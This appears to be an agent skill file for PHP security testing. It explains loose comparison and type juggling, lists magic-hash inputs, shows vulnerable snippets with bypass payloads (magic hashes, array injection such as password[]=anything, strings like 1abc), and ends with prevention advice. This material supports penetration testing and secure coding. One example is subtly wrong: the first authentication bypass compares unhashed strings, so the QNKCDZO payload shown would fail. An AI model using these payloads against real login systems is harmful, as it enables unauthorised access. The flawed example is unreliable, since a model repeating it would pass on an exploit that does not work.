---
name: type-juggling
description: PHP type juggling and loose comparison bypass with magic hashes. Use for PHP security testing.
---

# Type Juggling (PHP)

## Description
PHP is a loosely typed language that automatically converts (juggles) variable types during comparisons and operations. This behavior can lead to unexpected comparison results and security vulnerabilities, especially in authentication mechanisms.

## Comparison Types

### Loose Comparison (==)
Compares only values, with type conversion:
```php
'123' == 123     // true (string converted to int)
'123a' == 123    // true (string parsed as int)
'abc' == 0       // true (non-numeric string = 0)
'' == 0          // true (empty string = 0)
NULL == false    // true
[] == false      // true
'0' == false     // true
```

### Strict Comparison (===)
Compares both value AND type:
```php
'123' === 123    // false (different types)
'123a' === 123   // false
'abc' === 0      // false
'' === 0         // false
```

## Magic Hashes

When strings starting with "0e" (scientific notation) are compared as numbers, they evaluate to 0.

### MD5 Magic Hashes
```
String              MD5 Hash
240610708           0e462097431906509019562988736854
QNKCDZO             0e830400451993494058024219903391
QLTHNDT             0e405967825401955372549139051580
PJNPDWY             0e291529052894702774557631701704
NWWKITQ             0e763082070976038347657360123429
NOOPCJF             0e818888003657176127862245791911
MMHUWUV             0e701732711630150438129209816536
MAUXXQC             0e478478466848439040434801845361
IHKFRNS             0e256160682445802696926137988570
GZECLQZ             0e537612333747236407713628225676
GGHMVOE             0e362766013028313274586933780773
GEGHBXL             0e248776895502908863709684713578
EEIZDOI             0e782601363539291779881938479162
DYAXWCA             0e424759758842488633464374063001
DQWRASX             0e742373665639232907775599582643
BRSJCSH             0e772024669645083515687424816073
aabg7XSs            0e087386482136013740957780965295
aabC9RqS            0e041022518165728065344349536299
```

### SHA1 Magic Hashes
```
String              SHA1 Hash
aaroZmOk            0e66507019969427134894567494305185566735
aaK1STfY            0e76658526655756207688271159624026011393
aaO8zKZF            0e89257456677279068558073954252716165668
aa3OFF9m            0e36977786278517984959260394024281014729
```

## Exploitation Techniques

### Authentication Bypass

#### Vulnerable Code
```php
<?php
if ($_POST['password'] == '240610708') {
    echo "Access granted!";
}
?>
```

#### Exploitation
```
POST: password=QNKCDZO

# Both MD5 hashes start with 0e, so:
# md5('240610708') == md5('QNKCDZO')
# evaluates to 0 == 0 which is true
```

### Hash Comparison Bypass

#### Vulnerable Code
```php
<?php
if (md5($_POST['password']) == md5($stored_password)) {
    authenticate();
}
?>
```

#### Exploitation
If `$stored_password` has a magic hash:
```
POST: password=QNKCDZO

# If stored password's MD5 starts with 0e
# Both compared as 0 == 0 = true
```

### Array vs String Comparison

```php
<?php
// Vulnerable
if ($_GET['password'] == 'secret') {
    // authenticated
}

// Bypass with array
// GET: password[]=anything
// [] == 'secret' is false, but may cause warnings/errors
?>
```

### Integer Overflow

```php
<?php
$a = '9223372036854775807';  // PHP_INT_MAX as string
$b = '9223372036854775808';  // PHP_INT_MAX + 1

var_dump($a == $b);  // true (both overflow to same float)
?>
```

### strcmp() Bypass

```php
<?php
// Vulnerable
if (strcmp($_POST['password'], $correct_password) == 0) {
    authenticate();
}

// Bypass with array
// POST: password[]=anything
// strcmp(array, string) returns NULL
// NULL == 0 is true in loose comparison
?>
```

### switch Statement

```php
<?php
// Vulnerable
switch ($_GET['action']) {
    case 0:
        echo "admin";
        break;
    case 1:
        echo "user";
        break;
}

// GET: action=abcd
// 'abcd' == 0 is true (string cast to 0)
// Admin access granted
?>
```

### in_array() Bypass

```php
<?php
$whitelist = array(0, 1, 2);

// Vulnerable
if (in_array($_GET['value'], $whitelist)) {
    // allowed
}

// GET: value=0abc
// '0abc' == 0 is true
// Bypass achieved

// Secure: use strict mode
if (in_array($_GET['value'], $whitelist, true)) {
    // Uses strict comparison
}
?>
```

## PHP 8 Changes

PHP 8 introduced stricter type comparisons:

```php
// PHP 7
0 == "foo"    // true
0 == ""       // true
0 == null     // true

// PHP 8
0 == "foo"    // false (string compared as string)
0 == ""       // false
0 == null     // true (still)
```

### Still Vulnerable in PHP 8
```php
// Magic hashes still work
"0e123" == "0e456"  // true (both are 0 in scientific notation)

// String to number with numeric strings
"123" == 123  // true
```

## Testing Methodology

### 1. Identify Comparison Operations
```
- Look for == and != operators
- Check strcmp(), strcasecmp()
- Check in_array(), array_search()
- Check switch statements
```

### 2. Test Magic Hash Values
```
POST: password=QNKCDZO
POST: password=240610708
```

### 3. Test Array Injection
```
POST: password[]=anything
GET: ?param[]=test
```

### 4. Test Type Confusion
```
POST: id=1abc     # may be cast to 1
POST: count=0x1A  # hexadecimal
POST: value=1e2   # scientific notation (100)
```

## Prevention

### Use Strict Comparison
```php
// Always use === instead of ==
if ($input === $expected) {
    // Safe
}
```

### Use hash_equals()
```php
// Timing-safe comparison for hashes
if (hash_equals($stored_hash, $user_hash)) {
    // Safe
}
```

### Type Casting
```php
// Explicitly cast types
$id = (int) $_GET['id'];
$name = (string) $_POST['name'];
```

### Strict Mode for Functions
```php
// in_array with strict mode
if (in_array($value, $array, true)) {
    // Uses strict comparison
}

// array_search with strict mode
$key = array_search($value, $array, true);
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
- https://www.php.net/manual/en/types.comparisons.php
- https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
